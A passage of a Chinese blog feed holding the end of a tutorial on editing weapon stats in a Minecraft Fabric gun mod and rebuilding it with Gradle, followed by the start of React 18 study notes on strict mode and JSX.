class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color: #D4D4D4">   </span><span style="color: #6A9955">// 将sniper_classice狙击步枪进行注册，CLASSIC_SNIPER_RIFLE为注册后的静态名称，主要咱们看GunItem的参数</span></span><span class="line"><span style="color: #569CD6">public</span><span style="color: #D4D4D4"> </span><span style="color: #569CD6">static</span><span style="color: #D4D4D4"> </span><span style="color: #569CD6">final</span><span style="color: #D4D4D4"> </span><span style="color: #4EC9B0">Item</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">CLASSIC_SNIPER_RIFLE</span><span style="color: #D4D4D4"> = </span><span style="color: #DCDCAA">registerItem</span><span style="color: #D4D4D4">(</span><span style="color: #CE9178">"sniper_classic"</span><span style="color: #D4D4D4">, </span><span style="color: #C586C0">new</span><span style="color: #D4D4D4"> </span><span style="color: #DCDCAA">GunItem</span><span style="color: #D4D4D4">(</span><span style="color: #C586C0">new</span><span style="color: #D4D4D4"> </span><span style="color: #DCDCAA">FabricItemSettings</span><span style="color: #D4D4D4">().</span><span style="color: #DCDCAA">group</span><span style="color: #D4D4D4">(</span><span style="color: #9CDCFE">AnimatedGuns</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">GUNS</span><span style="color: #D4D4D4">).</span><span style="color: #DCDCAA">maxCount</span><span style="color: #D4D4D4">(</span><span style="color: #B5CEA8">1</span><span style="color: #D4D4D4">), </span><span style="color: #6A9955">//使用FabricItemSettings设置物品的显示效果</span></span><span class="line"><span style="color: #D4D4D4"></span><span style="color: #CE9178">"sniper_classic"</span><span style="color: #D4D4D4">, </span><span style="color: #6A9955">// 枪的ID名，请勿修改</span></span><span class="line"><span style="color: #D4D4D4"></span><span style="color: #CE9178">"sniper_classic"</span><span style="color: #D4D4D4">, </span><span style="color: #6A9955">// 枪的名称，请勿修改</span></span><span class="line"><span style="color: #D4D4D4">       </span><span style="color: #B5CEA8">29</span><span style="color: #D4D4D4">, </span><span style="color: #6A9955">// 枪的伤害值</span></span><span class="line"><span style="color: #D4D4D4">       </span><span style="color: #B5CEA8">20</span><span style="color: #D4D4D4">, </span><span style="color: #6A9955">// 枪的射速</span></span><span class="line"><span style="color: #D4D4D4">       </span><span style="color: #B5CEA8">5</span><span style="color: #D4D4D4">, </span><span style="color: #6A9955">// 枪的弹匣弹药容量</span></span><span class="line"><span style="color: #D4D4D4">       HEAVY_RIFLE_BULLET, </span><span style="color: #6A9955">// 枪的子弹类型</span></span><span class="line"><span style="color: #D4D4D4">       </span><span style="color: #B5CEA8">36</span><span style="color: #D4D4D4">, </span><span style="color: #6A9955">// 子弹装填时间，单位为ticks，Minecraft的ticks是1/20秒(s)，也就是50毫秒(ms)</span></span><span class="line"><span style="color: #D4D4D4">       </span><span style="color: #C586C0">new</span><span style="color: #D4D4D4"> </span><span style="color: #4EC9B0">float</span><span style="color: #D4D4D4">[] {</span><span style="color: #B5CEA8">0.125f</span><span style="color: #D4D4D4">, </span><span style="color: #B5CEA8">0.125f</span><span style="color: #D4D4D4">}, </span><span style="color: #6A9955">// 子弹散布/扩散范围</span></span><span class="line"><span style="color: #D4D4D4"> </span><span style="color: #C586C0">new</span><span style="color: #D4D4D4"> </span><span style="color: #4EC9B0">float</span><span style="color: #D4D4D4">[]{</span><span style="color: #B5CEA8">2.5f</span><span style="color: #D4D4D4">, </span><span style="color: #B5CEA8">8.25f</span><span style="color: #D4D4D4">}, </span><span style="color: #6A9955">// 后坐力</span></span><span class="line"><span style="color: #D4D4D4">       </span><span style="color: #B5CEA8">1</span><span style="color: #D4D4D4">, </span><span style="color: #6A9955">// 每次击发的子弹数，主要跟枪械开火模式有关，全自动和连发之类的</span></span><span class="line"><span style="color: #D4D4D4"></span><span style="color: #9CDCFE">GunItem</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">LoadingType</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">PER_CARTRIDGE</span><span style="color: #D4D4D4">, </span><span style="color: #6A9955">// 子弹装填方式，这里是击发一发后就装填一发</span></span><span class="line"><span style="color: #D4D4D4"></span><span style="color: #569CD6">null</span><span style="color: #D4D4D4">, </span><span style="color: #6A9955">// 装填开始时的音效</span></span><span class="line"><span style="color: #D4D4D4"></span><span style="color: #9CDCFE">ModSounds</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">RELOAD_GENERIC_SNIPER_P1</span><span style="color: #D4D4D4">, </span><span style="color: #6A9955">// 装填过程中弹匣拔出音</span></span><span class="line"><span style="color: #D4D4D4"></span><span style="color: #9CDCFE">ModSounds</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">RELOAD_CLASSIC_SNIPER_P2</span><span style="color: #D4D4D4">, </span><span style="color: #6A9955">// 装填过程中的新的弹匣装填音</span></span><span class="line"><span style="color: #D4D4D4"></span><span style="color: #9CDCFE">ModSounds</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">RELOAD_GENERIC_SNIPER_P3</span><span style="color: #D4D4D4">, </span><span style="color: #6A9955">// 装填结束时的音效</span></span><span class="line"><span style="color: #D4D4D4">       </span><span style="color: #9CDCFE">ModSounds</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">SNIPER_CLASSIC</span><span style="color: #D4D4D4">, </span><span style="color: #6A9955">// 子弹击发声音</span></span><span class="line"><span style="color: #D4D4D4">       </span><span style="color: #B5CEA8">5</span><span style="color: #D4D4D4">, </span><span style="color: #6A9955">// 重新装填弹匣的预期子弹数</span></span><span class="line"><span style="color: #D4D4D4">       </span><span style="color: #569CD6">true</span><span style="color: #D4D4D4">, </span><span style="color: #6A9955">// 是否具有瞄准镜</span></span><span class="line"><span style="color: #D4D4D4"> </span><span style="color: #569CD6">true</span><span style="color: #D4D4D4">, </span><span style="color: #6A9955">// 是否在射击后取消瞄准效果</span></span><span class="line"><span style="color: #D4D4D4">       </span><span style="color: #B5CEA8">12</span><span style="color: #D4D4D4">, </span><span style="color: #6A9955">// 下面都是重新装填子弹的各个阶段的持续时间</span></span><span class="line"><span style="color: #D4D4D4">       </span><span style="color: #B5CEA8">13</span><span style="color: #D4D4D4">,</span></span><span class="line"><span style="color: #D4D4D4">       </span><span style="color: #B5CEA8">24</span><span style="color: #D4D4D4">)</span></span><span class="line"><span style="color: #D4D4D4">       </span><span style="color: #6A9955">// 后面还有个{}，是一个匿名内部类，此处为空，但是可以在里面添加自定义的方法或覆盖父类的方法</span></span><span class="line"><span style="color: #D4D4D4">{</span></span><span class="line"><span style="color: #D4D4D4">});</span></span></code></pre></div></div></figure><p>当然旧版本会少对应的属性参数，而新版本的 1.20.1 则是增加了持枪动作类型和枪口等附件的支持的。</p><h3 id="构造函数解析"><a class="markdownIt-Anchor" href="#构造函数解析"></a> 构造函数解析</h3><p>GunItem 构造函数的具体参数要求如下：</p><p><img src="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/QQ_1721381736298.png" alt="1721381736298"></p><p>上面的构造函数参数类型要求请千万做到心中明确。</p><p>如果你学过 Java 或者其他编程语言，这部分你可以跳过，但是也请稍微留意一下参数类型要求。<s>否则修改一时爽，编译（）</s></p><p>好了，收回删除线伏笔，这些枪械可能存在的差异，如：全自动半自动的、装填方式、持枪方式等。我也给大家进行注释解释了，就在：<code>src\main\java\net\elidhan\anim_guns\item\GunItem.java</code> 的 826 行开始：</p><p><img src="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/QQ_1721247100101.png" alt="QQ_1721247100101"></p><p>这些都是枚举类型的，大家可以自行对应理解。而可装备的附件类型其实就在枪械的上面，或者说，在 json 文件中也能知道，好像就 3 种？：</p><p><img src="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/QQ_1721247279794.png" alt="QQ_1721247279794">zh_cn.json63 行处：</p><figure class="shiki json"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color: #CE9178">"item.anim_guns.sight_holo"</span><span style="color: #D4D4D4">:  </span><span style="color: #CE9178">"全息瞄准镜"</span><span style="color: #D4D4D4">,</span></span><span class="line"><span style="color: #CE9178">"item.anim_guns.grip_foregrip"</span><span style="color: #D4D4D4">:  </span><span style="color: #CE9178">"前握把"</span><span style="color: #D4D4D4">,</span></span><span class="line"><span style="color: #CE9178">"item.anim_guns.muzzle_mbrake"</span><span style="color: #D4D4D4">:  </span><span style="color: #CE9178">"枪口制动器"</span><span style="color: #D4D4D4">,</span></span></code></pre></div></div></figure><h2 id="实践-属性修改"><a class="markdownIt-Anchor" href="#实践-属性修改"></a> 实践 - 属性修改</h2><p>Ok，现在大家都有了基本认识，我们来简单修改一个 amr_classic 狙击枪的伤害值吧。</p><p>我们找到：<code>src\main\java\net\elidhan\anim_guns\item\ModItems.java</code> 的 689 行开始</p><p><img src="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/QQ_1721248383896.png" alt="QQ_1721248383896"></p><p>我们简单修改原伤害值 40 为 50</p><p><img src="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/QQ_1721248484232.png" alt="QQ_1721248484232"></p><p>Ok，这里我们的修改完成后，我们基本上就要进行编译了。不过在编译之前，我们先来添加一下国内镜像的仓库源，以防等会编译过程中可能出现的下载慢的情况。</p><p>我们打开 <code>build.gradle</code> 文件</p><p><img src="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/QQ_1721248808489.png" alt="QQ_1721248808489"></p><p>添加一个阿里云的 maven 地址：</p><figure class="shiki groovy"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color: #D4D4D4">maven{ url</span><span style="color: #CE9178">'https://maven.aliyun.com/nexus/content/groups/public/'</span><span style="color: #D4D4D4">}</span></span></code></pre></div></div></figure><p><img src="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/QQ_1721248879550.png" alt="QQ_1721248879550"></p><p>好的，我们做完修改之后，点击左上角的文件 -&gt; 全部保存。将我们做的修改保存下来，不然是不会生效的。</p><h2 id="实践-编译"><a class="markdownIt-Anchor" href="#实践-编译"></a> 实践 - 编译</h2><p>别关闭 Vscode 哦，我们直接在打开项目的 Vscode 上点击它上方导航栏的终端选项，<strong>新建一个终端</strong>用来运行我们要执行的命令：</p><p><img src="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/QQ_1721249073586.png" alt="QQ_1721249073586"></p><p>由于项目自带 gradlew 和 gradlew.bat，所以我们可以不用安装 gradle，我们直接使用它们来编译，执行命令为：</p><figure class="shiki sh"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color: #DCDCAA">.</span><span style="color: #D4D4D4">\gradlew </span><span style="color: #CE9178">build</span></span></code></pre></div></div></figure><p>如果出现绿字 BUILD SUCCESSFUL in 基本上是没问题的：</p><p><img src="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/QQ_1721249741382.png" alt="QQ_1721249741382"></p><p>编译后的文件在：Simple-Animated-Guns-1.20.1\build\libs 中</p><p><img src="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/QQ_1721249787069.png" alt="QQ_1721249787069"></p><p>不出意外的话，使用上面这个不带 sources 的 jar 包就可以了。</p><h2 id="实践-替换-jar-包测试"><a class="markdownIt-Anchor" href="#实践-替换-jar-包测试"></a> 实践 - 替换 jar 包测试</h2><p>打开 PCL2，将 jar 包替换（请备份原文件）</p><p><img src="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/QQ_1721249892892.png" alt="QQ_1721249892892"></p><p>这里我将原来我正常使用的 jar 包剪切出去，放在了编译后的目录下统一管理，接下来将我们编译的 jar 放回进行测试：</p><p><img src="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/QQ_1721249976750.png" alt="QQ_1721249976750"></p><p>替换之后，可以看到 PCL2 可以搜到我们替换的 jar 包</p><p><img src="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/QQ_1721250119387.png" alt="QQ_1721250119387"></p><p>接下来就是进游戏测试了：</p><p><img src="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/2024-07-18_05.07.31.png" alt="2024-07-18_05.07.31"></p><p>可以看到 Damage 伤害变成了我们修改后的 50，成功！</p><h2 id="准星修改"><a class="markdownIt-Anchor" href="#准星修改"></a> 准星修改</h2><p>本来到这里也该结束了，但是再稍微提一嘴准星的问题吧。</p><p>因为我是玩的 BetterMC1.20.1，玩过的朋友可能知道，它这个整合包的准星不是传统派的十字，而是十字左右套了个左右括号包裹起来，我是很难习惯，所以我就把它改回了传统的十字准星，这个改法在 BetterMC 的 MC 百科词条下的评论区我发了办法，感兴趣的可以看看：<a href="https://www.mcmod.cn/modpack/205.html">BetterMC 修改准星 489 楼评论</a></p><p><img src="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/QQ_1721252012398.png" alt="QQ_1721252012398"></p><h2 id="相关链接"><a class="markdownIt-Anchor" href="#相关链接"></a> 相关链接</h2><ul><li><p><a href="https://www.123pan.com/s/jqMxjv-rnGQv.html%E6%8F%90%E5%8F%96%E7%A0%81:Java">Java17 下载 - 提取码 Java</a></p></li><li><p><a href="https://wwf.lanzouj.com/b00pzoayid">原作者全版本源码 - 密码:h47e</a></p></li><li><p><a href="https://code.visualstudio.com/">Vscode 官网下载地址</a></p></li></ul><h2 id="勘误补充"><a class="markdownIt-Anchor" href="#勘误补充"></a> 勘误 &amp; 补充</h2><p>2024 年 7 月 18 日 21:54 勘误，补上原作者全版本源码链接。</p><p>2024 年 7 月 19 日 11:43 补充，在属性值部分补充关于构造函数的参数要求。</p><h2 id="可能遇到的问题"><a class="markdownIt-Anchor" href="#可能遇到的问题"></a> 可能遇到的问题</h2><ul><li>编译的时候显示：<code>Exception in thread "main" javax.net.ssl.SSLHandshakeException: PKIX path building failed: sun.security.provider.certpath.SunCertPathBuilderException: unable to find valid certification path to requested target</code></li></ul><p>请检查是否开启了系统代理。关闭后再尝试编译。</p><ul><li>编译时报错： 不兼容的类型：从 double 转换到 float 可能会有损失 &amp; 错误：找不到符号 &amp; 构造器 (FabricItemSettings,String,String,double,int,int,Item,int,float [],float [],int,LoadingType,&lt; 空值 &gt;,SoundEvent,SoundEvent,SoundEvent,SoundEvent,&lt; 空值 &gt;,int,boolean,boolean,int,int,int,FiringType,ArmType,AttachType [])</li></ul><p>请检查属性值是否符合参数要求，如：9.5 默认为 double 类型，而构造函数要求为 float。请改为 9.5f 或 9.5F</p><ul><li><p>使用 gradlew 编译时提示：<code>gradlew : 无法将“gradlew”项识别为 cmdlet、函数、脚本文件或可运行程序的名称。请检查名称的拼写，如果包括路径，请确保路径正确，然后再试一次。</code></p><p>请检查 gradlew 是否在当前终端读取到的目录下，换言之，请检查终端当前的目录下有没有 <code>gradlew.bat</code> 或者 <code>gradlew</code> 这个文件，否则无法执行命令。</p></li></ul><link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
      
      
      <categories>
          
          <category> Minecraft </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Minecraft </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>React18 学习笔记</title>
      <link href="/posts/36922.html"/>
      <url>/posts/36922.html</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdnjs.cloudflare.com/ajax/libs/hint.css/2.7.0/hint.min.css"><meta name="referrer" content="no-referrer"><meta name="description" content="React18学习笔记。"><h2 id="创建-demo-工程"><a class="markdownIt-Anchor" href="#创建-demo-工程"></a> 创建 demo 工程</h2><p>命令为 <code>npx create-react-app react-basic</code></p><h2 id="严格模式"><a class="markdownIt-Anchor" href="#严格模式"></a> 严格模式</h2><p>React18 默认创建的工程开启了严格模式。React 应用在开发环境下若使用了 React 的严格模式（<code>&lt;React.StrictMode&gt;</code>），在渲染过程中，所有组件都会被调用两次。这是为了帮助检测不严谨的代码和潜在的问题。</p><p>具体在 <code>src\index.js</code> 中将 <code>&lt;React.StrictMode&gt;</code> 标签去掉即可</p><figure class="shiki jsx"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color: #C586C0">import</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">React</span><span style="color: #D4D4D4"> </span><span style="color: #C586C0">from</span><span style="color: #D4D4D4"> </span><span style="color: #CE9178">"react"</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #C586C0">import</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">ReactDOM</span><span style="color: #D4D4D4"> </span><span style="color: #C586C0">from</span><span style="color: #D4D4D4"> </span><span style="color: #CE9178">"react-dom/client"</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #C586C0">import</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">App</span><span style="color: #D4D4D4"> </span><span style="color: #C586C0">from</span><span style="color: #D4D4D4"> </span><span style="color: #CE9178">"./App"</span><span style="color: #D4D4D4">;</span></span><span class="line"></span><span class="line"><span style="color: #569CD6">const</span><span style="color: #D4D4D4"> </span><span style="color: #4FC1FF">root</span><span style="color: #D4D4D4"> = </span><span style="color: #9CDCFE">ReactDOM</span><span style="color: #D4D4D4">.</span><span style="color: #DCDCAA">createRoot</span><span style="color: #D4D4D4">(</span><span style="color: #9CDCFE">document</span><span style="color: #D4D4D4">.</span><span style="color: #DCDCAA">getElementById</span><span style="color: #D4D4D4">(</span><span style="color: #CE9178">"root"</span><span style="color: #D4D4D4">));</span></span><span class="line"><span style="color: #9CDCFE">root</span><span style="color: #D4D4D4">.</span><span style="color: #DCDCAA">render</span><span style="color: #D4D4D4">(</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #808080">&lt;</span><span style="color: #4EC9B0">React.StrictMode</span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #808080">&lt;</span><span style="color: #4EC9B0">App</span><span style="color: #D4D4D4"> </span><span style="color: #808080">/&gt;</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #808080">&lt;/</span><span style="color: #4EC9B0">React.StrictMode</span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #D4D4D4">);</span></span></code></pre></div></div></figure><p>即：</p><figure class="shiki jsx"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color: #C586C0">import</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">React</span><span style="color: #D4D4D4"> </span><span style="color: #C586C0">from</span><span style="color: #D4D4D4"> </span><span style="color: #CE9178">"react"</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #C586C0">import</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">ReactDOM</span><span style="color: #D4D4D4"> </span><span style="color: #C586C0">from</span><span style="color: #D4D4D4"> </span><span style="color: #CE9178">"react-dom/client"</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #C586C0">import</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">App</span><span style="color: #D4D4D4"> </span><span style="color: #C586C0">from</span><span style="color: #D4D4D4"> </span><span style="color: #CE9178">"./App"</span><span style="color: #D4D4D4">;</span></span><span class="line"></span><span class="line"><span style="color: #569CD6">const</span><span style="color: #D4D4D4"> </span><span style="color: #4FC1FF">root</span><span style="color: #D4D4D4"> = </span><span style="color: #9CDCFE">ReactDOM</span><span style="color: #D4D4D4">.</span><span style="color: #DCDCAA">createRoot</span><span style="color: #D4D4D4">(</span><span style="color: #9CDCFE">document</span><span style="color: #D4D4D4">.</span><span style="color: #DCDCAA">getElementById</span><span style="color: #D4D4D4">(</span><span style="color: #CE9178">"root"</span><span style="color: #D4D4D4">));</span></span><span class="line"><span style="color: #9CDCFE">root</span><span style="color: #D4D4D4">.</span><span style="color: #DCDCAA">render</span><span style="color: #D4D4D4">(</span><span style="color: #808080">&lt;</span><span style="color: #4EC9B0">App</span><span style="color: #D4D4D4"> </span><span style="color: #808080">/&gt;</span><span style="color: #D4D4D4">);</span></span></code></pre></div></div></figure><h2 id="jsx-概念"><a class="markdownIt-Anchor" href="#jsx-概念"></a> JSX 概念</h2><p>JSX 是 JavaScript 和 XML（HTML）的缩写，并非标准的 JS 语法，而是一种语法扩展，其表示在 JS 代码中编写 HTML 模版结构，它是 React 中编写 UI 模版的方式。</p><figure class="shiki jsx"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color: #569CD6">function</span><span style="color: #D4D4D4"> </span><span style="color: #DCDCAA">App</span><span style="color: #D4D4D4">() {</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #C586C0">return</span><span style="color: #D4D4D4"> (</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #808080">&lt;</span><span style="color: #569CD6">div</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">className</span><span style="color: #D4D4D4">=</span><span style="color: #CE9178">"App"</span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #808080">&lt;</span><span style="color: #569CD6">h1</span><span style="color: #808080">&gt;</span><span style="color: #D4D4D4">Hello World</span><span style="color: #808080">&lt;/</span><span style="color: #569CD6">h1</span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #808080">&lt;/</span><span style="color: #569CD6">div</span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #D4D4D4">  );</span></span><span class="line"><span style="color: #D4D4D4">}</span></span><span class="line"></span><span class="line"><span style="color: #C586C0">export</span><span style="color: #D4D4D4"> </span><span style="color: #C586C0">default</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">App</span><span style="color: #D4D4D4">;</span></span></code></pre></div></div></figure><blockquote><p>在 React 中，<code>className</code> 是用来指定 HTML 元素的 CSS 类的属性。由于 JavaScript 语言中 <code>class</code> 是一个保留字，因此在 JSX 中使用 <code>class</code> 时会出现语法错误。因此，React 使用 <code>className</code> 来替代 <code>class</code>。</p></blockquote><p>可以使用在线网站查看 jsx 如何被 babel 转为 js 语法：<a href="https://www.babeljs.io">https://www.babeljs.io</a></p><p>点击网站上方导航栏的 try it out 将 react 勾选上就可以简单看看：</p><p><img src="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/202411091620738.png" alt="image-20241109162000100"></p><h2 id="jsx-中使用-js-表达式"><a class="markdownIt-Anchor" href="#jsx-中使用-js-表达式"></a> JSX 中使用 JS 表达式</h2><p>在 JSX 中可以通过大括号 <code>{}</code> 识别 JavaScript 中的表达式，比如常见的变量、函数调用、方法调用等等。常见场景有：</p><ol><li>使用引号传递字符串</li><li>使用 JavaScript 变量</li><li>函数调用和方法调用</li><li>使用 JavaScript 对象 </li></ol><figure class="shiki jsx"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color: #569CD6">const</span><span style="color: #D4D4D4"> </span><span style="color: #4FC1FF">msg</span><span style="color: #D4D4D4"> = </span><span style="color: #CE9178">"Easy React"</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #569CD6">function</span><span style="color: #D4D4D4"> </span><span style="color: #DCDCAA">sayMyName</span><span style="color: #D4D4D4">() {</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #C586C0">return</span><span style="color: #D4D4D4"> </span><span style="color: #CE9178">"The name is John Wick"</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">}</span></span><span class="line"><span style="color: #569CD6">function</span><span style="color: #D4D4D4"> </span><span style="color: #DCDCAA">App</span><span style="color: #D4D4D4">() {</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #C586C0">return</span><span style="color: #D4D4D4"> (</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #808080">&lt;</span><span style="color: #569CD6">div</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">className</span><span style="color: #D4D4D4">=</span><span style="color: #CE9178">"App"</span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #808080">&lt;</span><span style="color: #569CD6">h1</span><span style="color: #808080">&gt;</span><span style="color: #D4D4D4">Simple Title</span><span style="color: #808080">&lt;/</span><span style="color: #569CD6">h1</span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #569CD6">{</span><span style="color: #6A9955">/** 使用引号传递字符串 */</span><span style="color: #569CD6">}</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #569CD6">{</span><span style="color: #CE9178">"This is a string"</span><span style="color: #569CD6">}</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #808080">&lt;</span><span style="color: #569CD6">br</span><span style="color: #808080">&gt;&lt;/</span><span style="color: #569CD6">br</span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #569CD6">{</span><span style="color: #6A9955">/** 使用JS变量 */</span><span style="color: #569CD6">}</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #569CD6">{</span><span style="color: #9CDCFE">msg</span><span style="color: #569CD6">}</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #808080">&lt;</span><span style="color: #569CD6">br</span><span style="color: #808080">&gt;&lt;/</span><span style="color: #569CD6">br</span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #569CD6">{</span><span style="color: #6A9955">/** 函数调用 */</span><span style="color: #569CD6">}</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #569CD6">{</span><span style="color: #DCDCAA">sayMyName</span><span style="color: #D4D4D4">()</span><span style="color: #569CD6">}</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #808080">&lt;</span><span style="color: #569CD6">br</span><span style="color: #808080">&gt;&lt;/</span><span style="color: #569CD6">br</span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #569CD6">{</span><span style="color: #6A9955">/** 方法调用 */</span><span style="color: #569CD6">}</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #569CD6">{new</span><span style="color: #D4D4D4"> </span><span style="color: #DCDCAA">Date</span><span style="color: #D4D4D4">().</span><span style="color: #DCDCAA">toLocaleDateString</span><span style="color: #D4D4D4">()</span><span style="color: #569CD6">}</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #808080">&lt;</span><span style="color: #569CD6">br</span><span style="color: #808080">&gt;&lt;/</span><span style="color: #569CD6">br</span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #569CD6">{</span><span style="color: #6A9955">/** 使用JS对象 */</span><span style="color: #569CD6">}</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #808080">&lt;</span><span style="color: #569CD6">div</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">style</span><span style="color: #D4D4D4">=</span><span style="color: #569CD6">{</span><span style="color: #D4D4D4">{ </span><span style="color: #9CDCFE">color:</span><span style="color: #D4D4D4"> </span><span style="color: #CE9178">"blue"</span><span style="color: #D4D4D4"> }</span><span style="color: #569CD6">}</span><span style="color: #808080">&gt;</span><span style="color: #D4D4D4">早上好，夜之城。</span><span style="color: #808080">&lt;/</span><span style="color: #569CD6">div</span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #808080">&lt;/</span><span style="color: #569CD6">div</span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #D4D4D4">  );</span></span><span class="line"><span style="color: #D4D4D4">}</span></span><span class="line"></span><span class="line"><span style="color: #C586C0">export</span><span style="color: #D4D4D4"> </span><span style="color: #C586C0">default</span><span style="color: 